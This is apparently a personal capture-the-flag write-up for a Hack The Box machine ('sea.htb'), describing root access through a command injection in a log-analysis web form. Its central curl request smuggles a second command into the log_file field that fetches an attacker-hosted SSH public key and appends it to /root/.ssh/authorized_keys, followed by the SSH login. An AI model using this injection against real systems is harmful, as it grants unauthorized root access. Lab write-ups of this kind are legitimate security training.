**NOTE**
i had to turn on local host proxy within firefox for this to work

As you can see this is running root from screen shot

i find a system run command vulnerability that i am able to execute commands via sending curl command like ls

i tried for hours to get reverse shell, no luck, came close but couldnt find 0

i then with peeking around i found a .ssh dir in root/

im gonna upload my ssh key to it so i can just shell in, fuckers lol

so i start with generating new key and then serving my python3 server at port 80:
![[Pasted image 20250311230125.png]]
then just run a curl command:
Note you will need to use burpsuite to read request to find the auth_token
```
curl 'http://127.0.0.1:8000' \
  -H 'Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==' \
  --data-raw 'analyze_log=&log_file=;curl+http://10.10.14.3/ed25519_gen.pub+>>/root/.ssh/authorized_keys;#&'
```

![[Pasted image 20250311230336.png]]

means the target had successfully grabbed this key and now i will just straight up run this command to ssh into machine:
make sure your on the same dir as the python server... 
```
ssh -i ed25519_gen root@sea.htb
```

lol my idiot ass got stuck then realized. 

and grab root.txt :D

done!
